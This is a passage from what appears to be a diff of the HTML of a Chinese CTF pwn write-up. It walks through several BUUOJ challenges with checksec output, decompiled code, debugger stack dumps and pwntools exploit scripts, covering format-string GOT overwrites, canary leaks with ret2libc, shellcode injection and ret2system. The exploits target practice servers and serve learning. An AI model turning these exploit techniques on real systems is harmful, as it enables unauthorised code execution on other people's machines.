 </span></span><span class="line"><span class="cl">Repeater:aaaaa0x804888d.0xffffce5f.0xf7ffd53c.0xffffce68.0xf7fd95c5.0x46.0x61ffcf54.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.</span></span></code></pre></div><p>输入一串a测试下。</p>
-<div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">24</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">24</span>
 </span></span><span class="line"><span class="cl">00:0000│ esp    0xffffce3c —▸ 0x8048700 <span class="o">(</span>main+261<span class="o">)</span> ◂— add    esp, 0x10
 </span></span><span class="line"><span class="cl">01:0004│        0xffffce40 —▸ 0xffffcf60 ◂— 0x0
 </span></span><span class="line"><span class="cl">02:0008│        0xffffce44 —▸ 0x804888d ◂— push   edx /* <span class="s1">&#39;Repeater:%s\n&#39;</span> */
@@ -662,7 +688,7 @@
 第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
 fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：https://docs.pwntools.com/en/stable/fmtstr.html</p>
 <p>exp1:</p>
-<div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./axb_2019_fmt32&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">26417</span><span class="p">)</span>
@@ -684,7 +710,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;cat flag</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>exp2:</p>
-<div class="highlight" id="id-28"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./axb_2019_fmt32&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">26417</span><span class="p">)</span>
@@ -705,16 +731,19 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,{</span><span class="n">prt_got</span><span class="p">:</span><span class="n">system_add</span><span class="p">},</span><span class="n">numbwritten</span> <span class="o">=</span> <span class="mh">0xa</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;;cat flag</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x35others_babystack" class="heading-element">
-  <a href="#0x35others_babystack" class="heading-mark"></a>0x35.others_babystack</h2><p>查看保护：开了canary</p>
-<div class="highlight" id="id-29"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec babystack 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x35others_babystack" class="heading-element"><span>0x35.others_babystack</span>
+  <a href="#0x35others_babystack" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>查看保护：开了canary</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec babystack 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gwt/Desktop/babystack&#39;</span>
 </span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
 </span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
 </span></span><span class="line"><span class="cl">    Stack:    Canary found
 </span></span><span class="line"><span class="cl">    NX:       NX enabled
 </span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span></span></span></code></pre></div><p>main：</p>
-<div class="highlight" id="id-30"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-90h] BYREF
@@ -747,7 +776,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>store的read函数有溢出</p>
 <p><code>payload = 'a'*(0x90-8)</code></p>
-<div class="highlight" id="id-31"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">32</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">32</span>
 </span></span><span class="line"><span class="cl">00:0000│ rsp  0x7fffffffdde8 —▸ 0x400884 ◂— 0x7f00cc7d83cc4589
 </span></span><span class="line"><span class="cl">01:0008│      0x7fffffffddf0 ◂— 0x0
 </span></span><span class="line"><span class="cl">02:0010│      0x7fffffffddf8 —▸ 0x7fffffffde20 —▸ 0x7fffffffde30 —▸ 0x7fffffffdee0 —▸ 0x400a30 ◂— ...
@@ -764,7 +793,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">1e:00f0│      0x7fffffffded8 ◂— 0x10cdd61fbdf3e300 &lt;<span class="o">=</span> 这里就是canary
 </span></span><span class="line"><span class="cl">1f:00f8│      0x7fffffffdee0 —▸ 0x400a30 ◂— 0x41ff894156415741</span></span></code></pre></div><p>大致思路就是，先leak canary，然后是libcbase，再之后写system(/bin/sh)就OK</p>
 <p>exp：</p>
-<div class="highlight" id="id-32"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./babystack&#34;)</span>
 </span></span><span class="line"><span class="cl">
@@ -814,8 +843,11 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x36pwnable_start" class="heading-element">
-  <a href="#0x36pwnable_start" class="heading-mark"></a>0x36.pwnable_start</h2><div class="highlight" id="id-33"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec start 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x36pwnable_start" class="heading-element"><span>0x36.pwnable_start</span>
+  <a href="#0x36pwnable_start" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec start 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gwt/Desktop/start&#39;</span>
 </span></span><span class="line"><span class="cl">    Arch:     i386-32-little
 </span></span><span class="line"><span class="cl">    RELRO:    No RELRO
@@ -846,7 +878,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 .text:08048099                 add     esp, 14h
 .text:0804809C                 retn
 .text:0804809C _start          endp ; sp-analysis failed</code></pre><p>进去的栈布局是这样的:</p>
-<div class="highlight" id="id-35"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">00:0000│ ecx esp  0xffffd134 ◂— 0x2774654c <span class="o">(</span><span class="s2">&#34;Let&#39;&#34;</span><span class="o">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">00:0000│ ecx esp  0xffffd134 ◂— 0x2774654c <span class="o">(</span><span class="s2">&#34;Let&#39;&#34;</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl">01:0004│          0xffffd138 ◂— 0x74732073 <span class="o">(</span><span class="s1">&#39;s st&#39;</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl">02:0008│          0xffffd13c ◂— 0x20747261 <span class="o">(</span><span class="s1">&#39;art &#39;</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl">03:000c│          0xffffd140 ◂— 0x20656874 <span class="o">(</span><span class="s1">&#39;the &#39;</span><span class="o">)</span>
@@ -859,7 +891,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 <p>之后会sys_read，其中ebx=0,ecx=esp,edx=0x3c，且最后会add esp,14h.</p>
 <p>构造：<code>payload = 'a'*0x14+ p32(addr + 0x14) + shellcode</code></p>
 <p>Exp：</p>
-<div class="highlight" id="id-36"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#34;./start&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">25817</span><span class="p">)</span>
@@ -872,14 +904,17 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x14</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span><span class="o">+</span> <span class="n">shellcode</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## gdb.attach(io)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x37mrctf2020_easyoverflow" class="heading-element">
-  <a href="#0x37mrctf2020_easyoverflow" class="heading-mark"></a>0x37.mrctf2020_easyoverflow</h2><div class="highlight" id="id-37"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gwt</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">mrctf2020_easyoverflow</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x37mrctf2020_easyoverflow" class="heading-element"><span>0x37.mrctf2020_easyoverflow</span>
+  <a href="#0x37mrctf2020_easyoverflow" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gwt</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">mrctf2020_easyoverflow</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">gwt</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">mrctf2020_easyoverflow</span><span class="err">&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
-</span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span></span></span></code></pre></div><div class="highlight" id="id-38"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-70h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">a1</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-40h] BYREF
@@ -911,20 +946,23 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>exp:</p>
-<div class="highlight" id="id-39"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#34;./mrctf2020_easyoverflow&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">26267</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="s1">&#39;n0t_r3@11y_f1@g&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x38wustctf2020_getshell_2" class="heading-element">
-  <a href="#0x38wustctf2020_getshell_2" class="heading-mark"></a>0x38.wustctf2020_getshell_2</h2><div class="highlight" id="id-40"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec wustctf2020_getshell_2 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x38wustctf2020_getshell_2" class="heading-element"><span>0x38.wustctf2020_getshell_2</span>
+  <a href="#0x38wustctf2020_getshell_2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec wustctf2020_getshell_2 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gwt/Desktop/wustctf2020_getshell_2&#39;</span>
 </span></span><span class="line"><span class="cl">    Arch:     i386-32-little
 </span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
 </span></span><span class="line"><span class="cl">    Stack:    No canary found
 </span></span><span class="line"><span class="cl">    NX:       NX enabled
-</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span></span></span></code></pre></div><div class="highlight" id="id-41"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-18h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -934,12 +972,12 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">shell</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bbbbbbbbin_what_the_f?ck__--??/sh&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-42"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ ROPgadget --binary wustctf2020_getshell_2  --string <span class="s2">&#34;sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ ROPgadget --binary wustctf2020_getshell_2  --string <span class="s2">&#34;sh&#34;</span>
 </span></span><span class="line"><span class="cl">Strings <span class="nv">information</span>
 </span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
 </span></span><span class="line"><span class="cl">0x08048670 : sh</span></span></code></pre></div><p>有system，有sh.</p>
 <p>exp:</p>
-<div class="highlight" id="id-43"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#34;./wustctf2020_getshell_2&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">28068</span><span class="p">)</span>
@@ -948,8 +986,11 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">sh_add</span>  <span class="o">=</span> <span class="mh">0x08048670</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">call_sys</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh_add</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x39hitcontraining_magicheap" class="heading-element">
